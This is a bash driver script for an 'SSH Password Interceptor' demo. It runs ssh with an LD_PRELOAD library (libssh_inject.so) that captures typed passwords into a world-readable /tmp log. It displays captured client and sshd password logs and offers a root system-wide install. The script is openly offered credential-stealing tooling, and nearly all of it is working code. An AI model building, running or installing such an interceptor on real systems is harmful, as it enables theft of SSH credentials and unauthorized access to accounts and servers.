#!/bin/bash

# Advanced SSH Password Interceptor - Demonstration Script
# This script demonstrates the full capabilities of the interceptor

# Bold/color text
BOLD="\033[1m"
GREEN="\033[0;32m"
RED="\033[0;31m"
BLUE="\033[0;34m"
YELLOW="\033[0;33m"
NC="\033[0m" # No Color

echo -e "${BOLD}${BLUE}=== SSH Password Interceptor Demo ===${NC}"
echo

check_install() {
    if [ ! -f "libssh_inject.so" ]; then
        echo -e "${RED}Error: Libraries not compiled.${NC}"
        echo "Please run: make all"
        exit 1
    fi
}

# Check if libraries are compiled
check_install

# Function to display logs
show_logs() {
    local log_file=$1
    local description=$2
    
    echo -e "${BOLD}${description}${NC}"
    if [ -f "$log_file" ]; then
        echo "-------------------------------------------------------------------"
        cat "$log_file"
        echo "-------------------------------------------------------------------"
    else
        echo -e "${RED}Log file not found: $log_file${NC}"
    fi
    echo
}

# Main menu
while true; do
    echo -e "${BOLD}Demo Options:${NC}"
    echo "1) Local Client Testing (no install required)"
    echo "2) View Client Log"
    echo "3) View Server Log (if available)"
    echo "4) View Loader Log (if available)"
    echo "5) Install System-Wide (requires root)"
    echo "6) Exit"
    echo
    echo -n "Select option (1-6): "
    read -r option
    echo

    case $option in
        1)
            echo -e "${BOLD}${YELLOW}Testing SSH Client Password Interception${NC}"
            echo "This will run an SSH command with the interceptor attached."
            echo "The password will be captured to /tmp/ssh_inj.dbg"
            echo
            echo "Enter server to connect to (e.g., localhost, user@server):"
            read -r target
            echo
            
            if [ -z "$target" ]; then
                target="localhost"
            fi
            
            echo -e "${BOLD}Connecting to: $target${NC}"
            echo "When prompted, enter your password."
            echo "Press Ctrl+C to cancel if needed."
            echo
            
            # Clean log file
            rm -f /tmp/ssh_inj.dbg
            touch /tmp/ssh_inj.dbg
            chmod 666 /tmp/ssh_inj.dbg
            
            # Run SSH with the interceptor
            LD_PRELOAD=./libssh_inject.so ssh "$target"
            
            echo
            echo -e "${BOLD}${GREEN}Test completed!${NC}"
            echo "The password has been captured to /tmp/ssh_inj.dbg"
            echo
            ;;
            
        2)
            show_logs "/tmp/ssh_inj.dbg" "SSH Client Password Log"
            ;;
            
        3)
            show_logs "/tmp/sshd_inj.dbg" "SSH Server Password Log"
            ;;
            
        4)
            show_logs "/tmp/ssh_loader.dbg" "Loader Log"
            ;;
            
        5)
            echo -e "${BOLD}${YELLOW}Installing System-Wide${NC}"
            echo "This will install the interceptor system-wide."
            echo "Root privileges are required."
            echo
            read -p "Continue with installation? (y/n): " confirm
            
            if [ "$confirm" == "y" ] || [ "$confirm" == "Y" ]; then
                sudo ./install.sh
            else
                echo "Installation cancelled."
            fi
            echo
            ;;
            
        6)
            echo -e "${BOLD}Exiting demo.${NC}"
            exit 0
            ;;
            
        *)
            echo -e "${RED}Invalid option. Please try again.${NC}"
            ;;
    esac
    
    echo
    read -p "Press Enter to continue..."
    clear
done 